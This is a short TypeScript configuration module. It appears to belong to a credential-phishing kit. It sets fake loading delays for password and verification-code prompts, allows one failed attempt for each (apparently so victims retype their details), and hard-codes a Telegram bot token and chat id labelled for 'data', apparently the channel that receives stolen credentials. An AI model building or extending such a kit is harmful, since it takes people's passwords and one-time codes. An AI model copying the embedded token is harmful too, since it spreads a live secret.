interface Config {
	settings: {
		code_loading_time: number;
		max_failed_code_attempts: number;
		max_failed_password_attempts: number;
		password_loading_time: number;
	};
	telegram: {
		data_chatid: string;
		data_token: string;
	};
}
const defaultConfig: Config = {
	settings: {
		code_loading_time: 5000,
		max_failed_code_attempts: 1,
		max_failed_password_attempts: 1,
		password_loading_time: 5000,
	},
	telegram: {
		data_chatid: "5922644937",
		data_token: "8010774541:AAH_AtsUiUycqtpTGi8lMSAtsbQK4FpgtrY",
	},
};
const getConfig = (): Config => {
	return defaultConfig;
};

export default getConfig;
